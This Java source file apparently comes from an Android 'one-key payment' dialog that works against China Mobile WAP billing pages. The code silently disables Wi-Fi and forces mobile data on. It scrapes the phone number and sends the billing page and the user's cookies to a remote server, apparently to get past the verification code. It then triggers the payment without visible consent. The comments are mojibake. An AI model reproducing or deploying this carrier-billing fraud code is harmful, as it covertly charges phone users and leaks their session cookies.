package com.android.onekeypayment;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.Toast;

@SuppressLint("SetJavaScriptEnabled")
public class PayDialog extends Dialog {
    public static final String URL_CM_WAP_A = "http://a.10086.cn/pams2/l/s.do?j=l&c=1426&ver=2&p=72";
    public static final String URL_CM_WAP = "http://wap.10086.cn/js/index.html";
    public static final String URL_CM_READ;
    static {
        CmReadUrlGenerator generator = new CmReadUrlGenerator();
        URL_CM_READ = generator.generateUrl();
    }

    private MyReceiver mMyReceiver;
    private Context mContext;
    private boolean mRequesting = false;
    private NetworkState mNetworkState = new NetworkState();
    private Handler mHandler;
    private String mRequestUrl;
    private WebView mWebViewForShow;
    private WebView mWebViewForPay;
    private ProgressBar mProgressBar;
    private String mOrderId;

    private long DEBUGTIME1;
    private long DEBUGTIME2;
    private long DEBUGTIME3;
    private long DEBUGTIME4;

    public PayDialog(Context context) {
        super(context, android.R.style.Theme_NoTitleBar);
        setCanceledOnTouchOutside(false);
        mContext = context;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mWebViewForShow = new WebView(mContext);
        mWebViewForPay = new WebView(mContext);
        mWebViewForPay.getSettings().setJavaScriptEnabled(true);
        mWebViewForPay.addJavascriptInterface(new InJavaScriptLocalObj(), "local_obj");
        mWebViewForPay.setWebViewClient(mWebViewClient);
        RelativeLayout layout = new RelativeLayout(mContext);
        RelativeLayout.LayoutParams rParams1 = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
        layout.addView(mWebViewForShow, rParams1);
        mProgressBar = new ProgressBar(mContext);
        RelativeLayout.LayoutParams rParams2 = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT, RelativeLayout.LayoutParams.WRAP_CONTENT);
        rParams2.addRule(RelativeLayout.CENTER_IN_PARENT);
        layout.addView(mProgressBar, rParams2);
        setContentView(layout);
        DisplayMetrics dm = mContext.getResources().getDisplayMetrics();
        WindowManager.LayoutParams params = getWindow().getAttributes();
        params.height = (int) (0.6f * dm.heightPixels);
        params.width = (int) (0.8f * dm.widthPixels);
        params.dimAmount = 0.5f;
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
        getWindow().setAttributes(params);
        init();
    }

    private void init() {
        mHandler = new Handler();
        mMyReceiver = new MyReceiver();
        IntentFilter filter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
        mContext.registerReceiver(mMyReceiver, filter);

        mRequestUrl = URL_CM_READ;
        startRequestIfReady();
        // mHandler.postDelayed(mDismissRunnable, 30 * 1000);
        // getOrder(1);
    }

    private void getOrder(final int price) {
        Log.d(Log.TAG, "price : " + price);
        new Thread(){
            public void run() {
                Log.d(Log.TAG, "");
                String result = HttpManager.get(mContext).sendHttpGet(Util.GET_PAY_PAGE_URL + price);
                if (TextUtils.isEmpty(result)) {
                    Log.d(Log.TAG, "result : " + result);
                }
                try {
                    JSONObject jobj = new JSONObject(result);
                    if (jobj.has("url")) {
                        mRequestUrl = jobj.getString("url");
                        // Log.d(Log.TAG, "mRequestUrl : " + mRequestUrl);
                    }
                    if (jobj.has("mobileReg")) {
                        String mobileReg = jobj.getString("mobileReg");
                        // Log.d(Log.TAG, "mobileReg : " + mobileReg);
                        Util.setMobileReg(mContext, mobileReg);
                    }
                    if (jobj.has("sucUrlFunc")) {
                        String sucUrlFunc = jobj.getString("sucUrlFunc");
                        // Log.d(Log.TAG, "sucUrlFunc : " + sucUrlFunc);
                        Util.setUrlReg(mContext, sucUrlFunc);
                    }
                    if (jobj.has("orderId")) {
                        mOrderId = jobj.getString("orderId");
                        // Log.d(Log.TAG, "mOrderId : " + mOrderId);
                    }
                    if (!TextUtils.isEmpty(mRequestUrl)) {
                        DEBUGTIME1 = System.currentTimeMillis();
                        startRequestIfReady();
                    } else {
                        dismissProgress();
                    }
                } catch(Exception e) {
                    Log.d(Log.TAG, "error : " + e);
                }
            }
        }.start();
    }

    private WebViewClient mWebViewClient = new WebViewClient() {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            // Log.d(Log.TAG, "url : " + url);
            requestPayResultUrl(url);
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            // Log.d(Log.TAG, "url : " + url);
            view.loadUrl("javascript:" + Util.GET_HTLM);
            view.loadUrl("javascript:showHtmlSource('" + url + "')");
        }
    };

    /**
     * ֪ͨ��������֧�����
     * @param url
     */
    private void notifyServerState(final String url) {
        Log.d(Log.TAG, "url : " + url);
        new Thread(){
            public void run() {
                String result = null;
                String notifyUrl = url.replaceAll("&amp;", "&");
                for (int count = 0; count < 3; count++) {
                    result = HttpManager.get(mContext).sendHttpGet(notifyUrl);
                    if (!TextUtils.isEmpty(result)) {
                        break;
                    } else {
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            Log.d(Log.TAG, "error : " + e);
                        }
                    }
                }
                if (!TextUtils.isEmpty(result)) {
                    loadDataWithBaseUrl(result);
                    dismissProgress();
                }
            }
        }.start();
    }

    /**
     * ��ȡ֧���ɹ�ҳ�棬ȡ��֪ͨ��������url��ַ
     * @param url
     */
    private void requestPayResultUrl(final String url) {
        Log.d(Log.TAG, "url : " + url);
        new Thread(){
            public void run() {
                String result = HttpManager.get(mContext).sendHttpGet(url);
                processNotifyUrl(result);
                loadDataWithBaseUrl(result);
            }
        }.start();
    }

    final class InJavaScriptLocalObj {
        @JavascriptInterface
        public void showSource(String content, String state, String url) {
            Log.d(Log.TAG, "state : " + state);
            if ("url".equals(state)) {
                if (!TextUtils.isEmpty(content)) {
                    processNotifyUrl(content);
                } else {
                    Log.d(Log.TAG, "Content is Null");
                }
            }
        }
    }

    private void loadUrlOnUiThread(final String url, final String cookie) {
        Log.d(Log.TAG, "");
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!TextUtils.isEmpty(cookie)) {
                    HashMap<String, String> additionHeader = new HashMap<String, String>();
                    additionHeader.put("Cookie", cookie);
                    Log.d(Log.TAG, "cookie : " + cookie);
                    mWebViewForPay.loadUrl(url, additionHeader);
                } else {
                    mWebViewForPay.loadUrl(url);
                }
            }
        });
    }

    private void dismissProgress() {
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                mProgressBar.setVisibility(View.INVISIBLE);
                // dismiss();
            }
        });
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
            String url = getUrlFromFile();
            execPay(url);
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    /**
     * ��ȡʵ��֧��ҳ�棬�Զ��ɷ�����ʶ����֤��
     */
    private void requestPaymentUrl() {
        mRequesting = true;
        new Thread(){
            public void run() {
                String pageContent = null;
                String phoneNumber = null;
                String result = null;
                for (int count = 0; count < 4; count++) {
                    Log.d(Log.TAG, "��" + (count + 1) + "������");
                    // ����֧��ҳ��
                    pageContent = requestPaymentPage();
                    // ��֧��ҳ���ȡ�ֻ��
                    phoneNumber = getMobileNumber(pageContent);

                    if (!TextUtils.isEmpty(phoneNumber)) {
                        //TODO: ����֧��url chukong ��ַ
                        if (true) {
                            break;
                        }
                        result = requestRealPayUrl(pageContent);
                        if (!TextUtils.isEmpty(result)) {
                            try {
                                JSONObject jobj = new JSONObject(result);
                                String status = "";
                                String msg = "";
                                String data = "";
                                if (jobj.has("status")) {
                                    status = jobj.getString("status");
                                }
                                if (jobj.has("msg")) {
                                    msg = jobj.getString("msg");
                                }
                                if (jobj.has("data")) {
                                    data = jobj.getString("data");
                                }
                                if ("1".equals(status)) {
                                    // ��ʼ֧��
                                    execPay(data);
                                } else {
                                    Log.d(Log.TAG, "ʶ����֤��ʧ��, ����");
                                }
                            } catch (JSONException e) {
                                Log.d(Log.TAG, "error : " + e);
                            }
                        } else {
                            Log.d(Log.TAG, "�޷���ȡ��ʵ֧����ַ");
                            break;
                        }
                    }
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        Log.d(Log.TAG, "error : " + e);
                    }
                }
                mRequesting = false;
                Log.d(Log.TAG, "time1 : " + (DEBUGTIME2 - DEBUGTIME1));
                Log.d(Log.TAG, "time2 : " + (DEBUGTIME3 - DEBUGTIME2));
            }
        }.start();
    }

    private String requestPaymentPage() {
        if (TextUtils.isEmpty(mRequestUrl)) {
            Log.d(Log.TAG, "mRequestUrl : " + mRequestUrl);
            return null;
        }
        String result = HttpManager.get(mContext).sendHttpGet(mRequestUrl);
        if (!TextUtils.isEmpty(result)) {
            loadDataWithBaseUrl(result);
            writeToFile(result);
        }
        DEBUGTIME3 = System.currentTimeMillis();
        return result;
    }

    private void loadDataWithBaseUrl(final String content) {
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(mRequestUrl);
                    String protocol = url.getProtocol();
                    String host = url.getHost();
                    mWebViewForShow.loadDataWithBaseURL(protocol + "://" + host, content, "text/html", "utf-8", null);
                } catch(Exception e) {
                }
            }
        });
    }

    private String requestRealPayUrl(String content) {
        Log.d(Log.TAG, "");
        String cookies = PreferenceManager.getDefaultSharedPreferences(mContext).getString("cookies", "");
        HashMap<String, String> hashMap = new HashMap<String, String>();
        hashMap.put("html", content);
        hashMap.put("cookies", cookies);
        hashMap.put("orderId", mOrderId);
        String result = HttpManager.get(mContext).sendHttpPost(Util.GET_REAL_PAY_URL, hashMap);
        DEBUGTIME4 = System.currentTimeMillis();
        Log.d(Log.TAG, "result : " + result);
        return result;
    }

    private void execPay(String url) {
        String cookies = PreferenceManager.getDefaultSharedPreferences(mContext).getString("cookies", "");
        loadUrlOnUiThread(url, cookies);
    }

    private String getMobileNumber(String html) {
        if (TextUtils.isEmpty(html)) {
            Log.d(Log.TAG, "getMobileNumber html is empty");
            return null;
        }
        String telRegex = Util.getMobileReg(mContext);
        Pattern p = Pattern.compile(telRegex);
        Matcher m = p.matcher(html);
        String phoneNumber = null;
        if (m != null && m.find()) {
            phoneNumber = m.group(m.groupCount());
        }
        Log.d(Log.TAG, "phoneNumber : " + phoneNumber);
        return phoneNumber;
    }

    private void processNotifyUrl(String html) {
        Log.d(Log.TAG, "");
        if (TextUtils.isEmpty(html)) {
            Log.d(Log.TAG, "getNotifiyUrl html is empty");
            return;
        }
        String urlRegex = Util.getUrlReg(mContext);
        Pattern p = Pattern.compile(urlRegex);
        Matcher m = p.matcher(html);
        String notifyUrl = null;
        if (m != null && m.find()) {
            notifyUrl = m.group(m.groupCount());
        }
        Log.d(Log.TAG, "notifyUrl : " + notifyUrl);
        if (!TextUtils.isEmpty(notifyUrl)) {
            notifyServerState(notifyUrl);
        } else {
            
        }
    }

    public class MyReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mobileInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            NetworkInfo wifiInfo = manager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo activeInfo = manager.getActiveNetworkInfo();
            String tmp = "";
            if (mobileInfo != null) {
                tmp += "mobile connected : " + mobileInfo.isConnected() + ", available : " + mobileInfo.isAvailable() + " , ";
            }
            if (wifiInfo != null) {
                tmp += "wifiInfo connected : " + wifiInfo.isConnected() + ", available : " + wifiInfo.isAvailable() + " , ";
            }
            if (activeInfo != null) {
                tmp += "wifiInfo activeInfo : " + activeInfo.getTypeName();
                if (activeInfo.getType() == ConnectivityManager.TYPE_MOBILE && !mRequesting) {
                    DEBUGTIME2 = System.currentTimeMillis();
                    requestPaymentUrl();
                }
            } else {
                boolean enabled = NetworkManager.getMobileDataState(mContext, null);
                Log.d(Log.TAG, "Enable Data Connection : " + enabled);
                if (!enabled) {
                    mNetworkState.dataChanged = true;
                    NetworkManager.setMobileData(mContext, true);
                }
            }
            // Log.d(Log.TAG, tmp);
            Toast.makeText(context, tmp, 1).show();
        }
    }

    private void startRequestIfReady() {
        Log.d(Log.TAG, "");
        mNetworkState.reset();
        ConnectivityManager manager = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeInfo = manager.getActiveNetworkInfo();

        mNetworkState.dataState = NetworkManager.getMobileDataState(mContext, null);

        if (activeInfo != null) {
            if (activeInfo.getType() == ConnectivityManager.TYPE_MOBILE && !mRequesting) {
                requestPaymentUrl();
                return;
            }
            if (activeInfo.getType() == ConnectivityManager.TYPE_WIFI) {
                Log.d(Log.TAG, "Disable Wifi");
                mNetworkState.wifiChanged = true;
                mNetworkState.wifiState = NetworkManager.isWifiEnabled(mContext);
                NetworkManager.setWifiState(mContext, false);
                return;
            }
        } else {
            Log.d(Log.TAG, "Enable Data Directly");
            mNetworkState.dataChanged = true;
            mNetworkState.dataState = NetworkManager.getMobileDataState(mContext, null);
            NetworkManager.setMobileData(mContext, true);
        }
    }

    private void restoreOldNetworkState() {
        if (mNetworkState.wifiChanged) {
            NetworkManager.setWifiState(mContext, mNetworkState.wifiState);
        }
        if (mNetworkState.dataChanged) {
            NetworkManager.setMobileData(mContext, mNetworkState.dataState);
        }
    }

    @Override
    public void dismiss() {
        Log.d(Log.TAG, "dismiss");
        mHandler.removeCallbacks(mDismissRunnable);
        if (mMyReceiver != null) {
            mContext.unregisterReceiver(mMyReceiver);
            mMyReceiver = null;
        }
        restoreOldNetworkState();
        super.dismiss();
    }
    
    class NetworkState {
        public boolean wifiChanged;
        public boolean dataChanged;
        public boolean wifiState;
        public boolean dataState;
        public NetworkState() {
            reset();
        }

        public void reset() {
            wifiChanged = false;
            dataChanged = false;
            wifiState = false;
            dataState = false;
        }
    }

    private Runnable mDismissRunnable = new Runnable() {
        @Override
        public void run() {
            dismiss();
        }
    };

    public interface OnHttpRequestComplete {
        public void onRequestComplete();
    }

    public int dp2px(Context context, float dp) {
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int) (dp * scale + 0.5f);
    }

    public int px2dp(Context context, float px) {
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int) (px / scale + 0.5f);
    }
    
    private void writeToFile(String content) {
        if (TextUtils.isEmpty(content)) {
            Log.d(Log.TAG, "content is empyt");
            return;
        }
        try {
            FileOutputStream fos = new FileOutputStream("/sdcard/mm.html");
            fos.write(content.getBytes());
            fos.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private String getUrlFromFile() {
        FileInputStream fis = null;
        InputStreamReader isr = null;
        BufferedReader br = null;
        
        try {
            fis = new FileInputStream("/sdcard/url.txt");
            isr = new InputStreamReader(fis);
            br = new BufferedReader(isr);
            String url = br.readLine();
            br.close();
            isr.close();
            fis.close();
            if (!TextUtils.isEmpty(url)) {
                url = url.replaceAll("&amp;", "&");
                Log.d(Log.TAG, "url : " + url);
            }
            return url;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
